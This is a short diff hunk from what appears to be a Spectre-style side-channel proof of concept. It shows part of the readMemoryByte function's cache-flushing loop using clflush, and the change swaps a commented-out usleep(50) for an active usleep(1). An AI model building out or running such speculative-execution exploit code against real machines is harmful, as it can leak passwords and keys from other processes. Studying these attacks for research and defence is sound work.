@@ -49,7 +49,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
     results[i] = 0;
   for (tries = 999; tries > 0; tries--) {
     /* Flush array2[256*(0..255)] from cache */
-    // usleep(50);
+    usleep(1);
     for (i = 0; i < 256; i++)
       // usleep(1); Way too slow
       _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
